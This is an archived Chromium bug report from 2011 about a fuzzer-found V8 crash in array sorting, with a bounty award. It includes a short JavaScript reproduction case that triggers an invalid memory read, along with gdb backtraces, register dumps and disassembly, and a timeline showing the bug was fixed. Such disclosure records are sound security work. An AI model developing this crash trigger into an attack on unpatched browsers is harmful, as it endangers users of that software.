# [LangFuzz] Crash at JSObject::PrepareElementsForSort with invalid read

| Field | Value |
|-------|-------|
| **Issue ID** | [40093244](https://issues.chromium.org/issues/40093244) |
| **Status** | New |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | de...@googlemail.com |
| **Assignee** | da...@chromium.org |
| **Created** | 2011-07-29 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

The JavaScript code below crashes Chromium 15.0.838.0 and V8 shell at function "JSObject::PrepareElementsForSort" with an invalid read from address 0x41300001. This was tested on 32 bit, but I have seen the issue also on 64 bit in the fuzzer (test might be different).

**VERSION**  

Chrome Version: 15.0.838.0 (Developer Build 94616 Linux) dev  

Operating System: Ubuntu 11.04, tested on 32 bit

**REPRODUCTION CASE**  

function testsort(n) {  

n^= n\*n;  

var numbers=new Array(n);  

for (var i=0;i<n;i++) numbers[i]=i;  

numbers.sort();  

}

testsort("5001")

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

Program received signal SIGSEGV, Segmentation fault.  

IsOddball (this=0x5b23dca9, limit=25005272) at v8/src/objects-inl.h:581  

581 v8/src/objects-inl.h: No such file or directory.  

in v8/src/objects-inl.h

(gdb) bt  

#0 IsOddball (this=0x5b23dca9, limit=25005272) at v8/src/objects-inl.h:581  

#1 IsTheHole (this=0x5b23dca9, limit=25005272) at v8/src/objects-inl.h:793  

#2 v8::internal::JSObject::PrepareElementsForSort (this=0x5b23dca9,  

limit=25005272) at v8/src/objects.cc:10637  

#3 0x01064226 in v8::internal::Runtime\_RemoveArrayHoles (args=...,  

isolate=0x3581000) at v8/src/runtime.cc:9579  

#4 0x2e57a0b6 in ?? ()  

#5 0x2e585f02 in ?? ()  

#6 0x2e57b481 in ?? ()  

#7 0x2e5974c7 in ?? ()  

#8 0x2e5968a2 in ?? ()  

#9 0x2e58d4fa in ?? ()  

#10 0x2e57ddeb in ?? ()  

#11 0x00f63433 in v8::internal::Invoke (construct=<value optimized out>,  

func=..., receiver=..., argc=0, args=0x0, has\_pending\_exception=0xbfffd94f)  

at v8/src/execution.cc:121  

#12 0x00f63b15 in v8::internal::Execution::Call (callable=..., receiver=...,  

argc=0, args=0x0, pending\_exception=0xbfffd94f) at v8/src/execution.cc:158  

#13 0x00f2eff6 in v8::Script::Run (this=0x38190b4) at v8/src/api.cc:1555  

#14 0x017c7dd8 in WebCore::V8Proxy::runScript (this=0x35ece00, script=...,  

isInlineCode=false)

(gdb) info register  

eax 0x17d8cd8 25005272  

ecx 0x1 1  

edx 0x41300001 1093664769  

ebx 0x347de8c 55041676  

esp 0xbfffd5b0 0xbfffd5b0  

ebp 0x17d8cd8 0x17d8cd8  

esi 0xa12b8021 -1590984671  

edi 0x200003 2097155  

eip 0x1029b75 0x1029b75 [v8::internal::JSObject::PrepareElementsForSort(uint32\_t)+229](javascript:void(0);)  

eflags 0x210246 [ PF ZF IF RF ID ]  

cs 0x73 115  

ss 0x7b 123  

ds 0x7b 123  

es 0x7b 123  

fs 0x0 0  

gs 0x33 51

(gdb) x /4i $pc  

=> 0x1029b75 [v8::internal::JSObject::PrepareElementsForSort(uint32\_t)+229](javascript:void(0);): mov -0x1(%edx),%ecx  

0x1029b78 [v8::internal::JSObject::PrepareElementsForSort(uint32\_t)+232](javascript:void(0);): cmpb $0x82,0x7(%ecx)  

0x1029b7c [v8::internal::JSObject::PrepareElementsForSort(uint32\_t)+236](javascript:void(0);): jne 0x1029b60 [v8::internal::JSObject::PrepareElementsForSort(uint32\_t)+208](javascript:void(0);)  

0x1029b7e [v8::internal::JSObject::PrepareElementsForSort(uint32\_t)+238](javascript:void(0);): movzbl 0xb(%edx),%edx

## Timeline

### js...@chromium.org (2011-07-30)

@ager, @sgjesse - Could one of you direct this to the appropriate person on the v8 team?

### sc...@gmail.com (2011-08-01)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-08-02)

[Empty comment from Monorail migration]

### da...@chromium.org (2011-08-02)

[Empty comment from Monorail migration]

### da...@chromium.org (2011-08-02)

[Empty comment from Monorail migration]

### da...@chromium.org (2011-08-02)

Fixed in v8:8782, newly introduced in 3.5 so no branch merges needed. 

### sc...@gmail.com (2011-08-02)

Possibly bad casting? Using "High" severity.

### sc...@gmail.com (2011-08-24)

$1000

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-09-23)

Payment in system.

### js...@chromium.org (2011-10-05)

Batch update.

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-11)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/91008?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40093244)*
